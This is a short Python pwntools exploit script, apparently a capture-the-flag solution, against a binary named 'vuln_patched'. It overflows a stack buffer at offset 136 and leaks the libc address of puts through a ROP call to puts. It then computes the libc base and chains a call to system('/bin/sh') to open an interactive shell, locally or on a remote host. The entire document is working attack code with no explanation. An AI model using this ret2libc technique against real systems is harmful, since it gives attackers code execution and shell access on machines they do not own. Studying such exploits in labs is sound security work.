from pwn import *
if args.REMOTE:
    io = remote(sys.argv[1],sys.argv[2])
else:
    io = process("./vuln_patched", )

elf = context.binary = ELF("./vuln_patched", checksec=False)


libc = ELF("./libc.so.6", checksec=False)

context.log_level = 'info'

offset = 136

ret = 0x000000000040052e
pop_rdi = 0x0000000000400913

payload = b'A'*offset + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.sym['main'])

io.recvline()
io.sendline(payload)
io.recvline()
leaked = io.recv(6).ljust(8,b'\x00')
leaked = u64(leaked)
log.info(f'Leaked: {hex(leaked)}')
libc.address = leaked - libc.sym['puts']
log.info(f'LibC: {hex(libc.address)}')

rop =ROP(libc)

rop.system(next(libc.search(b'/bin/sh\x00')))

payload = b'A'*offset
payload += p64(ret)
payload += rop.chain()
io.sendline(payload)

io.interactive()
